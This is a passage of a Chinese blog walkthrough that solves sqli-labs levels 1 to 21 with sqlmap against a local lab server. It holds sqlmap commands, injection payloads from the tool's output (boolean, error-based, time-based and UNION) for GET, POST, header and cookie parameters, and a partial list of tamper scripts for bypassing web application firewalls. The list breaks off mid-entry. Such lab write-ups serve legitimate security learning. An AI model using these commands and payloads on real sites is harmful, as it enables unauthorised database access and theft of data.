    <content type="html"><![CDATA[<h1 id="Sqlmap、脚本解决sqli-labs"><a href="#Sqlmap、脚本解决sqli-labs" class="headerlink" title="Sqlmap、脚本解决sqli-labs"></a>Sqlmap、脚本解决sqli-labs</h1><h1 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-1/index.php?id=1 --batch --dbs</code></pre></div><h1 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-2/index.php?id=1 --batch --dbs</code></pre></div><h1 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-3/index.php?id=1 --batch --dbs</code></pre></div><h1 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><h1 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><p>利用：报错注入，时间盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 223 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27; AND 9191=9191 AND &#x27;</span>tjNq<span class="hljs-string">&#x27;=&#x27;</span>tjNq    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 5307 FROM(SELECT COUNT(*),CONCAT(0x716a787871,(SELECT (ELT(5307=5307,1))),0x7176767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>lDyx<span class="hljs-string">&#x27;=&#x27;</span>lDyx    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 7383 FROM (SELECT(SLEEP(5)))QnIP) AND &#x27;</span>rsQQ<span class="hljs-string">&#x27;=&#x27;</span>rsQQ</code></pre></div><h1 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><p>利用：二分注入、报错注入，时间盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">GET parameter <span class="hljs-string">&#x27;id&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 207 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause (MySQL comment)    Payload: id=1<span class="hljs-string">&quot; AND 5041=5041#</span><span class="hljs-string"></span><span class="hljs-string">    Type: error-based</span><span class="hljs-string">    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><span class="hljs-string">    Payload: id=1&quot;</span> AND (SELECT 3226 FROM(SELECT COUNT(*),CONCAT(0x716b706271,(SELECT (ELT(3226=3226,1))),0x717a6b6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zVCx    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&quot; AND (SELECT 5756 FROM (SELECT(SLEEP(5)))oBoe)-- dZNC</span><span class="hljs-string">---</span><span class="hljs-string"></span></code></pre></div><h1 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><p>利用：二分注入，时间盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 278 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27;) AND 9250=9250 AND (&#x27;</span>AWTH<span class="hljs-string">&#x27;=&#x27;</span>AWTH    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27;) AND (SELECT 4903 FROM (SELECT(SLEEP(5)))eIgu) AND (&#x27;</span>VQKm<span class="hljs-string">&#x27;=&#x27;</span>VQKm---</code></pre></div><h1 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><p>利用：二分注入，时间盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27; AND 3254=3254 AND &#x27;</span>Eznz<span class="hljs-string">&#x27;=&#x27;</span>Eznz    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 2673 FROM (SELECT(SLEEP(5)))noGG) AND &#x27;</span>TnYF<span class="hljs-string">&#x27;=&#x27;</span>TnYF---</code></pre></div><h1 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-4/index.php?id=1 --batch --dbs</code></pre></div><p>利用：二分注入，时间盲注</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 243 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&#x27; AND 6338=6338 AND &#x27;</span>zGGA<span class="hljs-string">&#x27;=&#x27;</span>zGGA    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: id=1<span class="hljs-string">&#x27; AND (SELECT 7400 FROM (SELECT(SLEEP(5)))lmWZ) AND &#x27;</span>pdvI<span class="hljs-string">&#x27;=&#x27;</span>pdvI---</code></pre></div><h1 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h1><p>从10开始之前的payload不奏效了。</p><p>从天书里看出只是换成了双引号，其实很简单，所以这里用到之前学到的prefix的方法</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-10/index.php?id=1 -p id --prefix <span class="hljs-string">&quot;\&quot;&quot;</span>  --batch --dbs</code></pre></div><p>二分注入、时间注入</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 798 HTTP(s) requests:---Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=1<span class="hljs-string">&quot; AND 4154=4154-- CDvk</span><span class="hljs-string"></span><span class="hljs-string">    Type: time-based blind</span><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><span class="hljs-string">    Payload: id=1&quot;</span> AND (SELECT 9271 FROM (SELECT(SLEEP(5)))fjSc)-- pRRC---</code></pre></div><h1 id="less11"><a href="#less11" class="headerlink" title="less11"></a>less11</h1><p>11是post注入</p><p>很简单，自动提交表单即可</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-11/index.php --forms --dbs</code></pre></div><p>二分注入、报错注入、时间盲注、union注入</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 125 HTTP(s) requests:---Parameter: uname (POST)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)    Payload: uname=HHNh<span class="hljs-string">&#x27; OR NOT 8084=8084#&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: error-based</span><span class="hljs-string">    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)</span><span class="hljs-string">    Payload: uname=HHNh&#x27;</span> OR (SELECT 1351 FROM(SELECT COUNT(*),CONCAT(0x7176717171,(SELECT (ELT(1351=1351,1))),0x7170716b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- zuew&amp;passwd=&amp;submit=Submit    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=HHNh<span class="hljs-string">&#x27; AND (SELECT 8246 FROM (SELECT(SLEEP(5)))ctEF)-- Ezsb&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: UNION query</span><span class="hljs-string">    Title: MySQL UNION query (NULL) - 2 columns</span><span class="hljs-string">    Payload: uname=HHNh&#x27;</span> UNION ALL SELECT CONCAT(0x7176717171,0x79456e586f4161764e7250446e485a67586e4a544e79484c756d6a4544536a717a5449576954656d,0x7170716b71),NULL<span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span>---</code></pre></div><h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>与less1相同的payload</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-12/index.php --forms --dbs</code></pre></div><p>报错、bool、时间、union都可以</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 134 HTTP(s) requests:---Parameter: uname (POST)    Type: boolean-based blind    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)    Payload: uname=hfRw<span class="hljs-string">&quot;) OR NOT 1620=1620#&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: error-based</span><span class="hljs-string">    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)</span><span class="hljs-string">    Payload: uname=hfRw&quot;</span>) AND EXTRACTVALUE(1777,CONCAT(0x5c,0x7178717171,(SELECT (ELT(1777=1777,1))),0x7171787a71)) AND (<span class="hljs-string">&quot;FDGb&quot;</span>=<span class="hljs-string">&quot;FDGb&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: time-based blind</span><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><span class="hljs-string">    Payload: uname=hfRw&quot;</span>) AND (SELECT 6736 FROM (SELECT(SLEEP(5)))stfK) AND (<span class="hljs-string">&quot;rnrd&quot;</span>=<span class="hljs-string">&quot;rnrd&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: UNION query</span><span class="hljs-string">    Title: MySQL UNION query (NULL) - 2 columns</span><span class="hljs-string">    Payload: uname=hfRw&quot;</span>) UNION ALL SELECT CONCAT(0x7178717171,0x655955517a486b7555414f47504a745979774842526d654a524a78516348664142695048464e6665,0x7171787a71),NULL<span class="hljs-comment">#&amp;passwd=&amp;submit=Submit</span>---</code></pre></div><h1 id="less13"><a href="#less13" class="headerlink" title="less13"></a>less13</h1><p>payload不变：</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-13/index.php --forms --dbs --batch</code></pre></div><p>但是速度有点慢，可以参考之前的优化设置，也可以直接指定使用的注入方法–thread 10 –batch</p><p>可以看出是加上了 ‘)</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1226 HTTP(s) requests:---Parameter: uname (POST)    Type: error-based    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=nosa<span class="hljs-string">&#x27;) OR (SELECT 9280 FROM(SELECT COUNT(*),CONCAT(0x717a6b7071,(SELECT (ELT(9280=9280,1))),0x71706a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- jgQP&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: time-based blind</span><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><span class="hljs-string">    Payload: uname=nosa&#x27;</span>) AND (SELECT 9185 FROM (SELECT(SLEEP(5)))QrLC)-- twvv&amp;passwd=&amp;submit=Submit---</code></pre></div><h1 id="less14"><a href="#less14" class="headerlink" title="less14"></a>less14</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-14/index.php --forms --dbs --thread 10 --batch</code></pre></div><p>双引号</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1225 HTTP(s) requests:---Parameter: uname (POST)    Type: error-based    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=gVWd<span class="hljs-string">&quot; OR (SELECT 7011 FROM(SELECT COUNT(*),CONCAT(0x717a6a6b71,(SELECT (ELT(7011=7011,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- EcVM&amp;passwd=&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: time-based blind</span><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)</span><span class="hljs-string">    Payload: uname=gVWd&quot;</span> AND (SELECT 2546 FROM (SELECT(SLEEP(5)))meQb)-- cASj&amp;passwd=&amp;submit=Submit---</code></pre></div><h1 id="less15"><a href="#less15" class="headerlink" title="less15"></a>less15</h1><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-15/index.php --forms --dbs --thread 10 --batch</code></pre></div><p>只能时间盲注，稍慢一点</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 91 HTTP(s) requests:---Parameter: uname (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=gtNL<span class="hljs-string">&#x27; AND (SELECT 4937 FROM (SELECT(SLEEP(5)))rzUm) AND &#x27;</span>KyvN<span class="hljs-string">&#x27;=&#x27;</span>KyvN&amp;passwd=&amp;submit=Submit---</code></pre></div><h1 id="less16"><a href="#less16" class="headerlink" title="less16"></a>less16</h1><p>出现了无法注入的情况。看天书说是”)</p><p>所以添加前缀</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-16/index.php --forms --dbs --thread 10 --prefix <span class="hljs-string">&quot;\&quot;)&quot;</span>  --batch</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">---Parameter: uname (POST)    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=JQyQ<span class="hljs-string">&quot;) AND (SELECT 3582 FROM (SELECT(SLEEP(5)))vtUP)-- bCkY&amp;passwd=&amp;submit=Submit</span><span class="hljs-string">---</span><span class="hljs-string"></span></code></pre></div><h1 id="less17"><a href="#less17" class="headerlink" title="less17"></a>less17</h1><p>第17关对uname参数有checkinput保护，如果不想绕过uname的话，注入点其实在passwd。</p><p>但是由于uname是一个确定的用户才能更新数据，所以这里不能自动填写表单了</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-17/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=&amp;submit=Submit&quot;</span> --dbs --thread 10  --prefix <span class="hljs-string">&quot;&#x27;&quot;</span> -p passwd --batch</code></pre></div><p>报错注入、时间注入</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1880 HTTP(s) requests:---Parameter: passwd (POST)    Type: error-based    Title: MySQL &gt;= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=admin&amp;passwd=<span class="hljs-string">&#x27; OR (SELECT 4589 FROM(SELECT COUNT(*),CONCAT(0x7178706b71,(SELECT (ELT(4589=4589,1))),0x717a627a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- hurJ&amp;submit=Submit</span><span class="hljs-string"></span><span class="hljs-string">    Type: time-based blind</span><span class="hljs-string">    Title: MySQL &gt;= 5.0.12 OR time-based blind (query SLEEP)</span><span class="hljs-string">    Payload: uname=admin&amp;passwd=&#x27;</span> OR (SELECT 8521 FROM (SELECT(SLEEP(5)))AJtH)-- HnnG&amp;submit=Submit---</code></pre></div><p>如果绕过转义，这里主要是绕过mysql_real_escape_string后再次加上单引号的限制， 暂时不知道如何进行绕过</p><h1 id="less18"><a href="#less18" class="headerlink" title="less18"></a>less18</h1><p>这一关是user-agent注入</p><blockquote><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP Referer头的值。但是你可以手动用-p参数设置想要测试的参数。</p></blockquote><p>例如： -p “id,user-agent”</p><p>想要执行到注入点需要提供正确的uname和passwd</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-18/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> --dbs --thread 10  -p <span class="hljs-string">&quot;user-agent&quot;</span>  --batch</code></pre></div><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200517191226342.png" alt="image-20200517191226342"></p><p>sqlmap发包默认如图，可以使用random-agent参数或者直接–user-agent参数指定。</p><p>可以使用报错注入和时间盲注。</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 1582 HTTP(s) requests:---Parameter: User-Agent (User-Agent)    Type: error-based    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: sqlmap/1.4<span class="hljs-comment">#stable (http://sqlmap.org)&#x27; AND EXTRACTVALUE(8499,CONCAT(0x5c,0x71626a7171,(SELECT (ELT(8499=8499,1))),0x7170717871)) AND &#x27;anbC&#x27;=&#x27;anbC</span>    Type: time-based blind    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind    Payload: sqlmap/1.4<span class="hljs-comment">#stable (http://sqlmap.org)&#x27; RLIKE SLEEP(5) AND &#x27;bpJy&#x27;=&#x27;bpJy</span>---</code></pre></div><h1 id="less19"><a href="#less19" class="headerlink" title="less19"></a>less19</h1><p>与18关类似，这一关是考察referer字段</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-19/index.php --data <span class="hljs-string">&quot;uname=admin&amp;passwd=admin&amp;submit=Submit&quot;</span> --dbs --thread 10  -p <span class="hljs-string">&quot;referer&quot;</span>  --batch</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap identified the following injection point(s) with a total of 413 HTTP(s) requests:---Parameter: Referer (Referer)    Type: boolean-based blind    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; RLIKE (SELECT (CASE WHEN (1980=1980) THEN 0x687474703a2f2f3139322e3136382e3133332e3136323a38302f73716c2f4c6573732d31392f696e6465782e706870 ELSE 0x28 END)) AND &#x27;</span>ARWO<span class="hljs-string">&#x27;=&#x27;</span>ARWO    Type: error-based    Title: MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; AND EXTRACTVALUE(8119,CONCAT(0x5c,0x71766b6b71,(SELECT (ELT(8119=8119,1))),0x7162707671)) AND &#x27;</span>nKgQ<span class="hljs-string">&#x27;=&#x27;</span>nKgQ    Type: time-based blind    Title: MySQL &gt;= 5.0.12 RLIKE time-based blind    Payload: http://192.168.133.162:80/sql/Less-19/index.php<span class="hljs-string">&#x27; RLIKE SLEEP(5) AND &#x27;</span>FSNZ<span class="hljs-string">&#x27;=&#x27;</span>FSNZ---</code></pre></div><h1 id="less20"><a href="#less20" class="headerlink" title="less20"></a>less20</h1><p>我们需要在cookie中带上uname字段。并且不需要有submit字段，测试cookie只需要level2即可</p><div class="hljs code-wrapper"><pre><code class="hljs sh">sqlmap -u http://192.168.133.162/sql/Less-20/index.php --cookie=<span class="hljs-string">&quot;uname=admin&quot;</span> --dbs --thread 10 --level 2  --batch</code></pre></div><div class="hljs code-wrapper"><pre><code class="hljs sh">Cookie parameter <span class="hljs-string">&#x27;uname&#x27;</span> is vulnerable. Do you want to keep testing the others (<span class="hljs-keyword">if</span> any)? [y/N] Nsqlmap identified the following injection point(s) with a total of 49 HTTP(s) requests:---Parameter: uname (Cookie)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: uname=admin<span class="hljs-string">&#x27; AND 6687=6687 AND &#x27;</span>KySP<span class="hljs-string">&#x27;=&#x27;</span>KySP    Type: error-based    Title: MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)    Payload: uname=admin<span class="hljs-string">&#x27; AND (SELECT 4501 FROM(SELECT COUNT(*),CONCAT(0x7178787071,(SELECT (ELT(4501=4501,1))),0x716b767671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND &#x27;</span>AXTs<span class="hljs-string">&#x27;=&#x27;</span>AXTs    Type: time-based blind    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)    Payload: uname=admin<span class="hljs-string">&#x27; AND (SELECT 4107 FROM (SELECT(SLEEP(5)))MHaz) AND &#x27;</span>sLBD<span class="hljs-string">&#x27;=&#x27;</span>sLBD    Type: UNION query    Title: Generic UNION query (NULL) - 3 columns    Payload: uname=-2840<span class="hljs-string">&#x27; UNION ALL SELECT CONCAT(0x7178787071,0x4d466f624d544e746e5669714a4e5a4b76686e6c7042487153507763574256777855626f58717868,0x716b767671),NULL,NULL-- AKIY</span><span class="hljs-string">---</span><span class="hljs-string"></span></code></pre></div><h1 id="less21"><a href="#less21" class="headerlink" title="less21"></a>less21</h1><p>这一关对cookie中的uname字段进行了base64编码</p><p>可以使用sqlmap  –list-tampers 查看所有tampers，和base64编码相关的是base64encode.py</p><div class="hljs code-wrapper"><pre><code class="hljs sh">* apostrophemask.py - Replaces apostrophe character (<span class="hljs-string">&#x27;) with its UTF-8 full width counterpart (e.g. &#x27;</span> -&gt; %EF%BC%87)* apostrophenullencode.py - Replaces apostrophe character (<span class="hljs-string">&#x27;) with its illegal double unicode counterpart (e.g. &#x27;</span> -&gt; %00%27)* appendnullbyte.py - Appends (Access) NULL byte character (%00) at the end of payload* base64encode.py - Base64-encodes all characters <span class="hljs-keyword">in</span> a given payload* between.py - Replaces greater than operator (<span class="hljs-string">&#x27;&gt;&#x27;</span>) with <span class="hljs-string">&#x27;NOT BETWEEN 0 AND #&#x27;</span> and equals operator (<span class="hljs-string">&#x27;=&#x27;</span>) with <span class="hljs-string">&#x27;BETWEEN # AND #&#x27;</span>* bluecoat.py - Replaces space character after SQL statement with a valid random blank character. Afterwards replace character <span class="hljs-string">&#x27;=&#x27;</span> with operator LIKE* chardoubleencode.py - Double URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %2553%2545%254C%2545%2543%2554)* charencode.py - URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %53%45%4C%45%43%54)* charunicodeencode.py - Unicode-URL-encodes all characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; %u0053%u0045%u004C%u0045%u0043%u0054)* charunicodeescape.py - Unicode-escapes non-encoded characters <span class="hljs-keyword">in</span> a given payload (not processing already encoded) (e.g. SELECT -&gt; \u0053\u0045\u004C\u0045\u0043\u0054)* commalesslimit.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;LIMIT M, N&#x27;</span> with <span class="hljs-string">&#x27;LIMIT N OFFSET M&#x27;</span> counterpart* commalessmid.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;MID(A, B, C)&#x27;</span> with <span class="hljs-string">&#x27;MID(A FROM B FOR C)&#x27;</span> counterpart* commentbeforeparentheses.py - Prepends (inline) comment before parentheses (e.g. ( -&gt; /**/()* concat2concatws.py - Replaces (MySQL) instances like <span class="hljs-string">&#x27;CONCAT(A, B)&#x27;</span> with <span class="hljs-string">&#x27;CONCAT_WS(MID(CHAR(0), 0, 0), A, B)&#x27;</span> counterpart* equaltolike.py - Replaces all occurrences of operator equal (<span class="hljs-string">&#x27;=&#x27;</span>) with <span class="hljs-string">&#x27;LIKE&#x27;</span> counterpart* escapequotes.py - Slash escape single and double quotes (e.g. <span class="hljs-string">&#x27; -&gt; \&#x27;</span>)* greatest.py - Replaces greater than operator (<span class="hljs-string">&#x27;&gt;&#x27;</span>) with <span class="hljs-string">&#x27;GREATEST&#x27;</span> counterpart* halfversionedmorekeywords.py - Adds (MySQL) versioned comment before each keyword* hex2char.py - Replaces each (MySQL) 0x&lt;hex&gt; encoded string with equivalent CONCAT(CHAR(),...) counterpart* htmlencode.py - HTML encode (using code points) all non-alphanumeric characters (e.g. <span class="hljs-string">&#x27; -&gt; &amp;#39;)</span><span class="hljs-string">* ifnull2casewhenisnull.py - Replaces instances like &#x27;</span>IFNULL(A, B)<span class="hljs-string">&#x27; with &#x27;</span>CASE WHEN ISNULL(A) THEN (B) ELSE (A) END<span class="hljs-string">&#x27; counterpart</span><span class="hljs-string">* ifnull2ifisnull.py - Replaces instances like &#x27;</span>IFNULL(A, B)<span class="hljs-string">&#x27; with &#x27;</span>IF(ISNULL(A), B, A)<span class="hljs-string">&#x27; counterpart</span><span class="hljs-string">* informationschemacomment.py - Add an inline comment (/**/) to the end of all occurrences of (MySQL) &quot;information_schema&quot; identifier</span><span class="hljs-string">* least.py - Replaces greater than operator (&#x27;</span>&gt;<span class="hljs-string">&#x27;) with &#x27;</span>LEAST<span class="hljs-string">&#x27; counterpart</span><span class="hljs-string">* lowercase.py - Replaces each keyword character with lower case value (e.g. SELECT -&gt; select)</span><span class="hljs-string">* luanginx.py - LUA-Nginx WAFs Bypass (e.g. Cloudflare)</span><span class="hljs-string">* modsecurityversioned.py - Embraces complete query with (MySQL) versioned comment</span><span class="hljs-string">* modsecurityzeroversioned.py - Embraces complete query with (MySQL) zero-versioned comment</span><span class="hljs-string">* multiplespaces.py - Adds multiple spaces (&#x27;</span> <span class="hljs-string">&#x27;) around SQL keywords</span><span class="hljs-string">* overlongutf8.py - Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. &#x27;</span> -&gt; %C0%A7)* overlongutf8more.py - Converts all characters <span class="hljs-keyword">in</span> a given payload to overlong UTF8 (not processing already encoded) (e.g. SELECT -&gt; %C1%93%C1%85%C1%8C%C1%85%C1%83%C1%94)* percentage.py - Adds a percentage sign (<span class="hljs-string">&#x27;%&#x27;</span>) infront of each character (e.g. SELECT -&gt; %S%E%L%E%C%T)* plus2concat.py - Replaces plus operator (<span class="hljs-string">&#x27;+&#x27;</span>) with (MsSQL) <span class="hljs-keyword">function</span> CONCAT() counterpart* plus2fnconcat.py - Replaces plus operator (<span class="hljs-string">&#x27;+&#x27;</span>) with (MsSQL) ODBC <span class="hljs-keyword">function</span> &#123;fn CONCAT()&#125; counterpart* randomcase.py - Replaces each keyword character with random <span class="hljs-keyword">case</span> value (e.g. SELECT -&gt; SEleCt)* randomcomments.py - Add random inline comments inside SQL keywords (e.g. SELECT -&gt; S/**/E/**/LECT)* sp_password.py - Appends (MsSQL) <span class="hljs-keyword">function</span> <span class="hljs-string">&#x27;sp_password&#x27;</span> to the end of the payload <span class="hljs-keyword">for</span> automatic obfuscation from DBMS logs* space2comment.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with comments <span class="hljs-string">&#x27;/**/&#x27;</span>* space2dash.py - Replaces space character (<span class="hljs-string">&#x27; &#x27;</span>) with a dash comment (<span class="hljs-string">&#x27;--&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)* space2hash.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)* space2morecomment.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with comments <span class="hljs-string">&#x27;/**_**/&#x27;</span>* space2morehash.py - Replaces (MySQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with a pound character (<span class="hljs-string">&#x27;#&#x27;</span>) followed by a random string and a new line (<span class="hljs-string">&#x27;\n&#x27;</span>)* space2mssqlblank.py - Replaces (MsSQL) instances of space character (<span class="hljs-string">&#x27; &#x27;</span>) with 